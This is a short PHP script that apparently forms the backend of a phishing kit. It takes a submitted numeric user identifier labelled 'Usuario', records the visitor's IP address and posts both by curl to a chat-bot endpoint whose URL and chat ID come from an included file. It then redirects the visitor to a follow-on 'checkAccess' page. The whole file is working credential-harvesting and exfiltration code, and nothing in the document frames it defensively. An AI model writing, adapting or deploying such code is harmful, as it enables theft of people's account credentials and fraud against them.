<?php

include 'access.php';
include 'ip.php';


//First form data
$user = $_POST['user'];


if (is_numeric($user) && strlen($user)>7) {
    //call the ip function to get the guest ip
$ip = getRealIP();
//Setting the message
$text = "Data:\n\nUsuario: \n".$user."\nIP: \n".$ip."\n\nEND";
$msg = $text;

if (!empty($user)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlMsg);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
    
    header('Location: ../checkAccess.php');
}else{
    header('Location: ../index.php');
}
}else{
    header('Location: ../index-error.php');
}

?>